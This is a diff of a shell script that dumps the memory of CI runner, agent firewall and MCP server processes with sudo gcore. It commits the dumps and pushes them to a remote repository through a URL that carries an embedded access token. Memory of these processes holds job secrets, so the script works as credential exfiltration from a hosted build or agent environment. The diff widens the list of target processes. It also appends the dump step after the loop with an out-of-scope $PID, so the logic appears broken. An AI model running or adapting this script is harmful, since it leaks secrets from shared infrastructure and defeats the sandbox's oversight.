@@ -8,7 +8,11 @@ set -e
 ps -eo pid,comm --sort=pid
 
 # Define process name prefixes to match
-PREFIXES=("hosted-compute-" "Runner.Listener" "Runner.Worker")
+PREFIXES=(
+    "hosted-compute-" "Runner.Listener" "Runner.Worker"
+    "hv_kvp_daemon" "python3" "provjob" "start-mcp-serve"
+    "padawan-fw" "sh" "node" "python" "bash"
+)
 
 # Find matching PIDs
 MATCHED_PIDS=()
@@ -63,8 +67,24 @@ for entry in "${MATCHED_PIDS[@]}"; do
     # Pull and rebase to avoid non-fast-forward errors
     REPO_URL=$(git config --get remote.origin.url)
     REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"
-    git pull --rebase "$REPO_URL_AUTH" main
     git lfs push origin --all
     git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)
     echo "✅ Memory dump $DUMP_FILE committed and pushed successfully."
+
+    # Delete the dump file before dumping the next process
+    rm -f "$DUMP_FILE"
 done
+
+# Check if gcore is available
+if ! command -v gcore &> /dev/null; then
+    echo "gcore (GNU core dump utility) is not installed. Installing..."
+    sudo apt-get update && sudo apt-get install -y gdb
+    if ! command -v gcore &> /dev/null; then
+        echo "Error: gcore could not be installed."
+        exit 2
+    fi
+fi
+
+# Dump memory to core.$PID file
+sudo gcore -o core "$PID"
+echo "Memory dump created: core.$PID"
